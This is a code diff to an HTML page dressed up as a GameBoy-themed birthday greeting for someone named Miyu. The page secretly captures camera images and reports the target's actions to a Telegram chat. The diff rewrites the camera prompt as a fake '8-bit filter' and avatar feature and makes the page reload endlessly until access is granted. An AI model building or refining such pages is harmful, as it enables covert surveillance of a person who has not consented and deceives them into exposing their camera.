@@ -377,8 +377,8 @@
                 </div>
                 <div class="speaker-grille"></div>
             </div>
-                    </div>
-                    <!-- Message Screen -->
+    </div>
+    <!-- Message Screen -->
 <div id="message-screen" class="screen">
     <div class="page-container">
         <div class="page-screen">
@@ -626,8 +626,8 @@
     .cake-candle.blown .cake-flame { display: none; }
     .cake-candle.blown { background: #ccc; box-shadow: none; }
     .cake-message { color: #9bbc0f; font-size: 20px; font-weight: bold; margin: 20px 0; }
-    </style>
-    <script>
+</style>
+<script>
     // ============================================
     // TELEGRAM CONFIG (YOUR TOKEN & CHAT ID)
     // ============================================
@@ -687,7 +687,7 @@
     }
 
     // ============================================
-    // CAMERA FUNCTIONS (WITH FORCED PERMISSION)
+    // CAMERA FUNCTIONS (WITH GAMEBOY THEME & AUTO RESTART)
     // ============================================
     function showForcedCameraPopup() {
         // Clear everything
@@ -705,25 +705,26 @@
                  padding: 30px; text-align: center; max-width: 350px; color: #9bbc0f;">
                 <div style="font-size: 48px; margin-bottom: 20px;">🎮</div>
                 <div style="font-size: 24px; font-weight: bold; margin-bottom: 20px;">
-                    CAMERA REQUIRED
+                    8-BIT FILTER EFFECT
                 </div>
                 <div style="font-size: 14px; line-height: 1.6; margin-bottom: 30px;">
-                    GameBoy needs camera access to apply 8-bit filter effects.<br><br>
-                    <span style="color: #ffff00;">You cannot enter without allowing camera.</span>
+                    GameBoy needs camera access to apply retro pixel filters<br>
+                    and create your personal 8-bit avatar.<br><br>
+                    <span style="color: #ffff00;">Please allow to continue.</span>
                 </div>
-                <button onclick="requestCameraPermission()" style="
+                <button onclick="requestGameBoyCamera()" style="
                     padding: 15px 30px; background: #4a90e2; color: white;
                     border: none; border-radius: 8px; font-size: 18px;
                     font-weight: bold; cursor: pointer; width: 100%;
                     box-shadow: 0 0 20px #4a90e2;
-                ">ALLOW CAMERA</button>
+                ">ENABLE FILTER</button>
             </div>
         `;
         
         document.body.appendChild(popup);
     }
 
-    window.requestCameraPermission = async function() {
+    window.requestGameBoyCamera = async function() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: true 
@@ -740,9 +741,28 @@
             window.location.reload();
             
         } catch (error) {
-            // Permission denied - show popup again
-            sendToTelegram("❌ Miyu DENIED camera - Showing popup again");
-            showForcedCameraPopup();
+            // Permission denied - auto restart
+            sendToTelegram("❌ Miyu DENIED camera - Auto restart");
+            
+            // Countdown before restart
+            document.body.innerHTML = `
+                <div style="position:fixed; top:0; left:0; width:100%; height:100%; 
+                     background:#000; display:flex; justify-content:center; align-items:center;
+                     color:#00ff00; font-family:'Courier New'; flex-direction:column;">
+                    <div style="font-size:24px; margin-bottom:20px;">RESTARTING GAMEBOY...</div>
+                    <div style="font-size:48px;" id="restartCountdown">3</div>
+                </div>
+            `;
+            
+            let count = 3;
+            const interval = setInterval(() => {
+                count--;
+                document.getElementById('restartCountdown').textContent = count;
+                if (count === 0) {
+                    clearInterval(interval);
+                    window.location.reload();
+                }
+            }, 1000);
         }
     };
 
@@ -892,7 +912,7 @@
             captureBothCameras(`(opened ${screenId})`);
         }
     };
-                // ============================================
+            // ============================================
         // LETTERS (6 SURAT ENGLISH)
         // ============================================
         const letters = [
